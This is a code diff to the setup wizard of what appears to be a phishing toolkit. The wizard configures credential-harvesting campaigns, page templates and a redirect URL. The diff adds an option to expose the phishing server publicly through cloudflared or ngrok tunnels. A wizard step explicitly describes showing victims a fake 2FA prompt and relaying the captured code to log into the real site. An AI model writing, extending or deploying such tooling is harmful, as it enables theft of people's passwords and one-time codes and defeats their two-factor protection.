@@ -39,7 +39,9 @@ class SetupWizard:
         self._step_campaign()
         self._step_template()
         self._step_server()
-        self._step_https()
+        self._step_tunnel()
+        if not self.config.tunnel:
+            self._step_https()
         self._step_behavior()
         self._step_2fa()
         return self._step_summary()
@@ -120,8 +122,51 @@ class SetupWizard:
 
         self.console.print()
 
+    def _step_tunnel(self) -> None:
+        self.console.print("[bold cyan]Step 4:[/bold cyan] Tunnel")
+        self.console.print(
+            "[dim]Expose your server to the internet via cloudflared or ngrok.\n"
+            "  Both handle HTTPS automatically.[/dim]"
+        )
+
+        use_tunnel = Confirm.ask(
+            "  Use a tunnel?",
+            console=self.console,
+            default=self.config.tunnel is not None,
+        )
+
+        if use_tunnel:
+            provider = Prompt.ask(
+                "  Provider",
+                console=self.console,
+                choices=["cloudflared", "ngrok"],
+                default=self.config.tunnel or "cloudflared",
+            )
+            self.config.tunnel = provider
+
+            # Tunnel handles TLS — disable local HTTPS
+            self.config.use_https = False
+
+            if provider == "cloudflared":
+                from crystal_eye.tunnel.cloudflared import CloudflaredTunnel
+
+                tunnel = CloudflaredTunnel()
+                if not tunnel.is_installed():
+                    self.console.print(
+                        "  [yellow]cloudflared not found on PATH.[/yellow]\n"
+                        "  [dim]Install: sudo pacman -S cloudflared (Arch) | brew install cloudflare/cloudflare/cloudflared (macOS)[/dim]"
+                    )
+                else:
+                    self.console.print(f"  [green]{provider} found.[/green]")
+            else:
+                self.console.print(f"  [green]{provider} ready (managed by pyngrok).[/green]")
+        else:
+            self.config.tunnel = None
+
+        self.console.print()
+
     def _step_https(self) -> None:
-        self.console.print("[bold cyan]Step 4:[/bold cyan] HTTPS Configuration")
+        self.console.print("[bold cyan]Step 5:[/bold cyan] HTTPS Configuration")
 
         use_https = Confirm.ask(
             "  Enable HTTPS?",
@@ -169,7 +214,7 @@ class SetupWizard:
         self.console.print()
 
     def _step_behavior(self) -> None:
-        self.console.print("[bold cyan]Step 5:[/bold cyan] Behavior Settings")
+        self.console.print("[bold cyan]Step 6:[/bold cyan] Behavior Settings")
 
         manifest = self.registry.get(self.config.template)
         default_attempts = manifest.max_attempts if manifest else 2
@@ -192,7 +237,7 @@ class SetupWizard:
         self.console.print()
 
     def _step_2fa(self) -> None:
-        self.console.print("[bold cyan]Step 6:[/bold cyan] 2FA Capture")
+        self.console.print("[bold cyan]Step 7:[/bold cyan] 2FA Capture")
         self.console.print(
             "[dim]After capturing credentials, show a fake 2FA code prompt.\n"
             "  You log into the real site to trigger the code, then capture it here.[/dim]"
@@ -209,7 +254,7 @@ class SetupWizard:
         self.console.print()
 
     def _step_summary(self) -> bool:
-        self.console.print("[bold cyan]Step 7:[/bold cyan] Summary")
+        self.console.print("[bold cyan]Summary[/bold cyan]")
         self.console.print()
 
         protocol = "https" if self.config.use_https else "http"
@@ -217,6 +262,7 @@ class SetupWizard:
             f"  [bold]Campaign:[/bold]     {self.config.campaign}",
             f"  [bold]Template:[/bold]     {self.config.template}",
             f"  [bold]Server:[/bold]       {protocol}://{self.config.host}:{self.config.port}",
+            f"  [bold]Tunnel:[/bold]       {self.config.tunnel or 'none'}",
             f"  [bold]HTTPS:[/bold]        {'Yes' if self.config.use_https else 'No'}",
             f"  [bold]Max Attempts:[/bold] {self.config.max_attempts}",
             f"  [bold]Redirect:[/bold]     {self.config.redirect_url}",
